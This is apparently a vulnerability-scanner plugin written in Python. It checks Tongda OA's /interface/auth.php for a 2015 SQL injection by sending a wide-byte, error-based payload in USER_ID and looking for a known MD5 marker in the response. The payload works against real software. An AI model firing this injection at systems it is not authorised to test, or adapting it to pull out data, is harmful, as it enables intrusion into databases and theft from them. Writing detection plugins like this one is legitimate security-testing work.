# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0002'  # 平台漏洞编号，留空
    name = '通达OA系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-27'  # 漏洞公布时间
    desc = '''
        通达OA系统代表了协同OA的先进理念,16年研发铸就成熟OA产品。
        通达OA系统/interface/auth.php页面参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0116359'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7f4dfa2f-fef7-4f85-a50e-7fb2472ea0ca'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2015-0116359
            payload = payload = '/interface/auth.php?&PASSWORD=1&USER_ID=%df%27%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(0x3a,md5(1122),0x3a)%20from%20user%20limit%201),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a)%23'
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code == 200 and '3b712de48137572f3849aabd5666a4e3' in req.text:
                # 如果EXT_USER在返回值里，那么USER_ID=存在注入
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
